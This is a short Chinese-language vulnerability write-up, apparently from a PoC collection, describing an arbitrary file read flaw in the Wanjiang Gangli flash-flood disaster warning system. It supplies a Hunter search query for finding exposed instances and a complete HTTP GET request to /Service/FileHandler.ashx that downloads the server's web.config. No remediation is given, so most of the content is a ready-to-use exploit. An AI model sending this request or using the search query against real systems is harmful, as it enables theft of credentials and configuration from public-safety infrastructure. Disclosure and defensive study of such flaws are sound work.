# 万江港利山洪灾害预警系统FileHandler存在任意文件读取漏洞

# 一、漏洞简介
万江港利山洪灾害防治预警系统软件是对空间信息技术、计算机网络技术、现代通信技术进行无缝集成，结合灾害监测预警的业务需求，采用世界领先GIS地理信息处理技术、RS遥感技术、GPRS/CMDA/3G通讯技术、Microsoft Silverlight Web前端应用程式开发解决方案、以及大容量数据采集技术和大容量数据存储等计算机网络通信与数据处理技术，建立一个用户界面友好的、多终端的、可定制的、集数据采集、存储、分析于一体的综合地理信息平台。该系统存在任意文件读取漏洞，攻击者可获取大量敏感信息。

# 二、影响版本
+ 万江港利山洪灾害防治预警系统

# 三、资产测绘
+ hunter`web.body="万江港利"&&web.body="山洪灾害"`
+ 特征

![1707060667669-c1ce32a0-4c8f-48f5-8702-058ae589fffa.png](./img/A2AaAQ5sO23Cp0KK/1707060667669-c1ce32a0-4c8f-48f5-8702-058ae589fffa-102132.png)

# 四、漏洞复现
```plain
GET /Service/FileHandler.ashx?Action=Download&FileDirectory=E:/SCWJ/Official/Web/MFCW/&FileName=web.config&FileSourceName=web HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1707060726033-c1ac27d9-a692-4c07-8089-79dba4b37fea.png](./img/A2AaAQ5sO23Cp0KK/1707060726033-c1ac27d9-a692-4c07-8089-79dba4b37fea-174339.png)



> 更新: 2024-02-29 23:55:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/oeggkvpxmlddh3qv>